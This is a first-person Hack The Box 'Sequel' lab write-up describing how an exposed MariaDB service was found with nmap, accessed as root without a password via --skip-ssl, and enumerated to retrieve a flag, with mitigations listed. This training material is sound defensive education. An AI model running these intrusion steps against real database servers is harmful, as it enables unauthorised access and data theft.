# HTB Starting Point - Sequel

## Overview

Sequel is a Tier 1 Hack The Box Starting Point machine focused on database enumeration and interaction with MySQL/MariaDB services. The objective was to identify an exposed database service, establish a connection, enumerate available databases and tables, and retrieve the flag.

This room introduced the fundamentals of database enumeration and demonstrated the risks associated with exposing database services directly to a network.

## Skills Learned

- Nmap service enumeration
- MySQL/MariaDB connectivity
- Database enumeration
- SQL query fundamentals
- Troubleshooting connection errors
- Database reconnaissance

## Tools Used

- Nmap
- MySQL Client
- Pwnbox

## Enumeration

### Service Discovery

I began by scanning the target machine to identify open ports and available services.

```bash
nmap -sV <target-ip>
```

### Results

```text
3306/tcp open mysql?
```

### Findings

- One open port was discovered.
- Port 3306 was exposed.
- The service appeared to be MySQL/MariaDB.
- The database service became the primary attack surface.

## Initial Access Attempts

After discovering the MySQL service, I attempted to connect using the root account.

### Command

```bash
mysql -h <target-ip> -u root
```

### Challenge Encountered

The connection failed with the following error:

```text
ERROR 2026 (HY000): TLS/SSL error:
SSL is required, but the server does not support it
```

### What I Learned

At first, I assumed the issue might be authentication-related. However, the error indicated that the problem was caused by SSL/TLS negotiation rather than invalid credentials.

This highlighted the importance of reading and understanding error messages instead of assuming every connection failure is caused by incorrect usernames or passwords.

## Troubleshooting

To bypass the SSL requirement, I reattempted the connection using the `--skip-ssl` option.

### Command

```bash
mysql -h <target-ip> -u root --skip-ssl
```

### Result

```text
Welcome to the MariaDB monitor.
```

Successfully connected to the database server.

### Server Information

```text
10.3.27-MariaDB-0+deb10u1 Debian 10
```

## Database Enumeration

### Listing Available Databases

```sql
SHOW DATABASES;
```

### Results

```text
htb
information_schema
mysql
performance_schema
```

### Findings

The custom database `htb` appeared most relevant to the challenge.

### Selecting the Database

```sql
USE htb;
```

### Enumerating Tables

```sql
SHOW TABLES;
```

### Results

```text
users
config
```

At this stage, I identified two tables that could potentially contain useful information.

## Flag Retrieval

I examined the available database content and successfully located the flag.

### Result

- Connected to the MariaDB service.
- Enumerated available databases.
- Located the custom `htb` database.
- Enumerated available tables.
- Retrieved the flag.

## Challenges Encountered

### Challenge 1: SSL/TLS Connection Error

**Problem**

```text
ERROR 2026 (HY000)
```

**Resolution**

```bash
mysql -h <target-ip> -u root --skip-ssl
```

**Lesson Learned**

Connection failures are not always caused by incorrect credentials. Understanding error messages can help identify configuration issues and lead to faster troubleshooting.

### Challenge 2: Determining Which Database to Investigate

Several databases were available:

```text
htb
information_schema
mysql
performance_schema
```

I needed to determine which database was likely associated with the challenge.

**Lesson Learned**

When enumerating databases, custom databases are generally more relevant to application-specific data, while system databases typically contain metadata and configuration information.

## Key Concepts

### MySQL

MySQL is a relational database management system (RDBMS) used to store and manage structured data.

### MariaDB

MariaDB is an open-source fork of MySQL that provides similar functionality while remaining fully compatible with many MySQL features.

### SQL

Structured Query Language (SQL) is used to query, manage, and modify information stored within databases.

### Database Enumeration

The process of discovering:

- Databases
- Tables
- Columns
- Records

to better understand a database environment.

## Security Lessons

### Vulnerability

- Exposed Database Service

### Risks

- Unauthorized database access
- Data disclosure
- Credential leakage
- Information gathering for future attacks

### Recommended Mitigations

- Restrict remote database access
- Use strong authentication
- Require encrypted connections
- Implement network segmentation
- Follow least-privilege principles

## Cybersecurity Relevance

This room is relevant to:

- Security Analyst
- SOC Analyst
- Database Security
- Penetration Testing
- Threat Hunting

Understanding how databases are exposed, accessed, and enumerated helps security professionals identify potential weaknesses and investigate suspicious database activity.

## Key Takeaways

- Enumeration should always come first.
- Port 3306 commonly indicates MySQL or MariaDB.
- Database services may be accessible without interacting with a web application.
- Error messages can provide valuable troubleshooting information.
- Database enumeration follows a structured process:
  - Discover service
  - Connect
  - Enumerate databases
  - Enumerate tables
  - Retrieve data

## Screenshots

1. Nmap Scan (`nmap-scan.png`)
2. MariaDB Connection (`mysql-connection.png`)
3. Database Enumeration (`show-databases.png`)
4. Flag Retrieval (`flag.png`)

## Reflection

Sequel provided a practical introduction to database enumeration and MariaDB interaction. Unlike Appointment, which focused on exploiting a web application vulnerability, this machine involved directly interacting with a database service. The most valuable lesson was learning how to troubleshoot connectivity issues, enumerate database structures, and methodically identify where useful information is stored.